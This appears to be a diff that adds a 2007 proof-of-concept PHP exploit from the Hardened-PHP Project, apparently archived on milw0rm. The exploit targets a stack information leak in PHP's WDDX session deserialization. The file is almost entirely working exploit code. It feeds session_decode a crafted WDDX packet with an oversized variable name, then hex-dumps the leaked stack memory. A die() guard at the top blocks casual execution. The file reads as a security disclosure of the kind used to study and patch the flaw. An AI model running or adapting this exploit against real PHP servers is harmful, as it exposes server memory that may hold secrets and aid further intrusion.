@@ -1,0 +1,49 @@
+<?php
+  ////////////////////////////////////////////////////////////////////////
+  //  _  _                _                     _       ___  _  _  ___  //
+  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
+  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
+  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
+  //                                                                    //
+  //         Proof of concept code from the Hardened-PHP Project        //
+  //                   (C) Copyright 2007 Stefan Esser                  //
+  //                                                                    //
+  ////////////////////////////////////////////////////////////////////////
+  //       PHP WDDX Session Deserialization Stack Information Leak      //
+  ////////////////////////////////////////////////////////////////////////
+
+  // This is meant as a protection against remote file inclusion.
+  die("REMOVE THIS LINE");
+
+  if (!extension_loaded("wddx")) {
+    die("wddx extension needed\n");
+  }
+
+  ini_set("session.serialize_handler", "wddx");
+  
+  session_start();
+  
+  session_decode("<wddxPacket version='1.0'><header/><data><struct><var name='".str_repeat("A",8192)."'><string>A</string></var><var name='1'><string>1</string></var></struct></data></wddxPacket>");    
+
+  $keys = array_keys($_SESSION);
+  $stackdump = $keys[1];
+  
+  echo "Stackdump\n---------\n\n";
+  
+  for ($b=0; $b<strlen($stackdump); $b+=16) {
+    printf("%08x: ", $b);
+    for ($i=0; $i<16; $i++) {
+      printf ("%02x ", ord($stackdump[$b+$i]));
+    }
+    for ($i=0; $i<16; $i++) {
+      $c = ord($stackdump[$b+$i]);
+      if ($c > 127 || $c < 32) {
+        $c = ord(".");
+      }
+      printf ("%c", $c);
+    }
+    printf("\n");
+  }
+?>
+
+# milw0rm.com [2007-03-04]
